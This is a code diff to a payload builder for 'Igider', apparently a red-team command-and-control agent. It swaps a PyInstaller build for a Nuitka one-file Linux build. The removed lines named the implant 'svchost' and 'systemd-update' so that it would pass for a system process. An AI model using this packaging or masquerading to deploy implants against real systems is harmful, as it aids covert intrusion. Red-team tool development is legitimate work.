@@ -38,7 +38,7 @@ class Igider(PayloadType):
             name="output",
             parameter_type=BuildParameterType.ChooseOne,
             description="How the final payload should be structured for execution",
-            choices=["py", "base64", "py_compressed", "one_liner", "elf_linux", "powershell_reflective"],
+            choices=["py", "base64", "py_compressed", "one_liner", "bin_linux", "powershell_reflective"],
             default_value="py"
         ),
         
@@ -209,135 +209,148 @@ class Igider(PayloadType):
 
 
 
-    def _create_pyinstaller_spec(self, target_os: str) -> str:
-        """Generate PyInstaller spec file for executable creation."""
+    def _build_executable(self, code: str) -> bytes:
+        """Build standalone Linux executable using Nuitka."""
 
-        exe_name = "svchost" if target_os == "windows" else "systemd-update"
-        console_mode = "False" if target_os == "windows" else "True"
-
-        # List of modules that should be forcibly included
-        hidden_imports = [
-            'json',
-            'ssl',
-            'base64',
-            'threading',
-            'time',
-            'urllib.request',
-            'urllib.parse',
-        ]
-
-        hidden_imports_str = ", ".join(f"'{mod}'" for mod in hidden_imports)
-
-        # Conditional bootloader path
-        bootloader_line = (
-            "bootloader='/usr/local/bin/pyinstaller_win64_loader.exe',"
-            if target_os == "windows" else ""
-        )
-
-        spec_content = textwrap.dedent(f"""
-            # -*- mode: python ; coding: utf-8 -*-
-            block_cipher = None
-
-            a = Analysis(
-                ['main.py'],
-                pathex=[],
-                binaries=[],
-                datas=[],
-                hiddenimports=[{hidden_imports_str}],
-                hookspath=[],
-                hooksconfig={{}},
-                runtime_hooks=[],
-                excludes=[],
-                win_no_prefer_redirects=False,
-                win_private_assemblies=False,
-                cipher=block_cipher,
-                noarchive=False,
-            )
-
-            pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
-
-            exe = EXE(
-                pyz,
-                a.scripts[0],
-                a.binaries,
-                a.zipfiles,
-                a.datas,
-                [],
-                name='{exe_name}',
-                debug=False,
-                {bootloader_line}
-                bootloader_ignore_signals=False,
-                strip=False,
-                upx=False,
-                upx_exclude=[],
-                runtime_tmpdir=None,
-                console={console_mode},
-                disable_windowed_traceback=False,
-                target_arch='x86_64',
-                codesign_identity=None,
-                entitlements_file=None
-            )
-        """)
-
-        return spec_content
-
-
-
-
-    def _build_executable(self, code: str, target_os: str) -> bytes:
-        # Check if PyInstaller is available
         try:
-            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
+            subprocess.run([sys.executable, "-m", "nuitka", "--version"],
                         capture_output=True, check=True)
         except (subprocess.CalledProcessError, FileNotFoundError):
-            raise Exception("PyInstaller is not installed")
+            raise Exception("Nuitka is not installed")
 
         with tempfile.TemporaryDirectory() as temp_dir:
-            # Create main Python file
-            main_py = os.path.join(temp_dir, "main.py")
-            with open(main_py, "w") as f:
+            # Write the provided code to igider1.py
+            main_file = os.path.join(temp_dir, "igider1.py")
+            with open(main_file, "w") as f:
                 f.write(code)
 
-            exe_name = "svchost.exe" if target_os == "windows" else "systemd-update"
-            exe_path = os.path.join(temp_dir, "dist", exe_name)
+            exe_path = os.path.join(temp_dir, "igider1.bin")  # Nuitka will generate binary here
+
             cmd = [
-                sys.executable, "-m", "PyInstaller",
+                sys.executable, "-m", "nuitka",
                 "--onefile",
-                "--name", exe_name,
-                "--distpath", os.path.join(temp_dir, "dist"),
-                "--workpath", os.path.join(temp_dir, "build"),
-                "--specpath", temp_dir,
-                "--console",
-                main_py
+                "--standalone",
+                main_file,
+                "--remove-output",
+                "--enable-plugin=anti-bloat",
+                "--company-name=Offensy",
+                "--product-name=IGIDER",
+                "--file-version=1.0.0.0",
+                "--product-version=1.0.0.0",
+                "--file-description=Red Team Penetration Testing Agent",
+                "--copyright=Copyright © 2024 Offensy. All rights reserved.",
+                "--trademarks=IGIDER",
+                "--noinclude-setuptools-mode=error",
+                "--noinclude-pytest-mode=error",
+                "--noinclude-IPython-mode=error",
+                # Forced includes
+                "--include-module=sys",
+                "--include-module=psutil",
+                "--include-module=pefile",
+                "--include-module=builtins",
+                "--include-module=time",
+                "--include-module=os",
+                "--include-module=warnings",
+                "--include-module=math",
+                "--include-module=operator",
+                "--include-module=itertools",
+                "--include-module=random",
+                "--include-module=types",
+                "--include-module=keyword",
+                "--include-module=reprlib",
+                "--include-module=collections",
+                "--include-module=functools",
+                "--include-module=enum",
+                "--include-module=re",
+                "--include-module=json",
+                "--include-module=socket",
+                "--include-module=select",
+                "--include-module=selectors",
+                "--include-module=errno",
+                "--include-module=struct",
+                "--include-module=binascii",
+                "--include-module=base64",
+                "--include-module=platform",
+                "--include-module=ssl",
+                "--include-module=contextlib",
+                "--include-module=getpass",
+                "--include-module=urllib",
+                "--include-module=urllib.request",
+                "--include-module=urllib.parse",
+                "--include-module=urllib.error",
+                "--include-module=urllib.response",
+                "--include-module=email",
+                "--include-module=email.errors",
+                "--include-module=email.quoprimime",
+                "--include-module=email.base64mime",
+                "--include-module=quopri",
+                "--include-module=email.encoders",
+                "--include-module=email.charset",
+                "--include-module=email.header",
+                "--include-module=email._parseaddr",
+                "--include-module=email.utils",
+                "--include-module=email._policybase",
+                "--include-module=email.feedparser",
+                "--include-module=email.parser",
+                "--include-module=email._encoded_words",
+                "--include-module=email.iterators",
+                "--include-module=email.message",
+                "--include-module=http",
+                "--include-module=http.client",
+                "--include-module=calendar",
+                "--include-module=datetime",
+                "--include-module=ipaddress",
+                "--include-module=locale",
+                "--include-module=zlib",
+                "--include-module=bz2",
+                "--include-module=lzma",
+                "--include-module=shutil",
+                "--include-module=tempfile",
+                "--include-module=nturl2path",
+                "--include-module=threading",
+                "--include-module=queue",
+                "--include-module=hmac",
+                "--include-module=ctypes",
+                "--include-module=signal",
+                "--include-module=subprocess",
+                "--include-module=csv",
+                "--include-module=pathlib",
+                "--include-module=zipfile",
+                "--include-module=textwrap",
+                "--include-module=ast",
+                "--include-module=opcode",
+                "--include-module=dis",
+                "--include-module=token",
+                "--include-module=tokenize",
+                "--include-module=linecache",
+                "--include-module=inspect",
+                "--include-module=importlib",
+                "--include-module=importlib.metadata",
+                "--include-module=importlib.resources",
+                "--include-module=typing",
+                "--include-module=pkgutil",
+                "--include-module=tkinter",
+                "--enable-plugin=tk-inter",
+                "--include-package=cryptography",
+                "--include-module=cryptography.hazmat.primitives.ciphers",
+                "--include-module=cryptography.hazmat.primitives.ciphers.algorithms",
+                "--include-module=cryptography.hazmat.primitives.ciphers.modes",
+                "--include-module=cryptography.hazmat.backends",
+                "--output-filename=" + exe_path
             ]
 
-            try:
-                self.logger.info(f"Running PyInstaller: {' '.join(cmd)}")
-                result = subprocess.run(
-                    cmd,
-                    capture_output=True,
-                    text=True,
-                    cwd=temp_dir,
-                    timeout=300
-                )
+            self.logger.info(f"Running Nuitka: {' '.join(cmd)}")
+            result = subprocess.run(cmd, capture_output=True, text=True, cwd=temp_dir, timeout=600)
 
-                if result.returncode != 0:
-                    raise Exception(f"PyInstaller failed: {result.stderr}")
+            if result.returncode != 0:
+                raise Exception(f"Nuitka build failed: {result.stderr}")
 
-                if not os.path.exists(exe_path):
-                    raise Exception(f"Executable not found at {exe_path}")
+            if not os.path.exists(exe_path):
+                raise Exception(f"Executable not found at {exe_path}")
 
-                try:
-                    ftype = subprocess.check_output(["file", exe_path]).decode().strip()
-                    self.logger.info(f"Generated executable type: {ftype}")
-                except Exception:
-                    pass
+            with open(exe_path, "rb") as f:
+                return f.read()
 
-                with open(exe_path, "rb") as f:
-                    return f.read()
-
-            except Exception as e:
-                raise Exception(f"Build failed: {str(e)}")
             
             
     async def build(self) -> BuildResponse:
@@ -551,10 +564,10 @@ class Igider(PayloadType):
                 resp.payload = one_liner.encode()
                 resp.build_message = "Successfully built one-liner payload"
 
-            elif output_format == "elf_linux":
+            elif output_format == "bin_linux":
                 try:
                     await self.update_build_step("Finalizing Payload", "Building Linux executable...")
-                    executable_data = self._build_executable(base_code, "linux")
+                    executable_data = self._build_executable(base_code)
                     resp.payload = executable_data
                     resp.updated_filename = (self.filename).split(".")[0] +".elf"
                     resp.build_message = "Successfully built Linux executable"
